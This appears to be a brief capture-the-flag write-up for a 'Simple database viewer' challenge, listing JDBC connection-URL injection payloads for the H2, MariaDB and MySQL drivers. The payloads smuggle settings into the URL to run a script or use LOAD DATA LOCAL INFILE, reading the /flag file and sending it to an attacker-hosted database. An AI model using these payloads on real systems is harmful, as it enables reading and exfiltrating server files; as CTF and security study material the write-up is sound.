# Simple database viewer

Hope is for people to go from jdbc error messages to something like [this](https://su18.org/post/jdbc-connection-url-attack/).

## h2 driver

`/?driver=h2:mem:1337;INIT=RUNSCRIPT FROM 'file&host=/flag';IGNORE_UNKNOWN_SETTINGS=&port=`
flag is printed in error message

## mariadb driver

host a mysql database <here>
`CREATE DATABASE mydb;`
`CREATE TABLE IF NOT EXISTS mydb.table1 (stuff VARCHAR(255));`
`/?driver=mysql&host=<here>&port=3306&username=root&password=asd&query=LOAD DATA LOCAL INFILE '/flag' INTO TABLE mydb.table1;`
tcpdump traffic for flag or `SELECT * from mydb.table1;`

## mysql driver

same idea but need to allowLoadLocalInfile=TRUE
`/?driver=mysql&host=<here>&port=3306?allowLoadLocalInfile=TRUE&username=root&password=asd&query=LOAD DATA LOCAL INFILE '/flag' INTO TABLE mydb.table1;`

## more?
